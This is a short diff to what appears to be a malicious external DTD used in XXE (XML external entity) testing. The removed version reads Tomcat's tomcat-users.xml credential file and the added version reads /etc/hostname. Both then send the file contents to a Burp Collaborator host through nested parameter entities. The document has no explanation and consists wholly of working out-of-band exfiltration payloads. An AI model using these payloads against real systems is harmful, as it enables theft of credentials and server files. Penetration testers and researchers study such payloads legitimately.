@@ -1,2 +1,4 @@
-<!ENTITY % payload SYSTEM "file:///opt/tomcat/conf/tomcat-users.xml"> <!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://ague463n3w7vlamav1p9ypoy4pafy4.burpcollaborator.net/x=%payload;">'> %param1; %external;
-
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://pb4tzly2yb2agphpqgkot4jdz45wtl.burpcollaborator.net/?x=%file;'>">
+%eval;
+%exfiltrate;
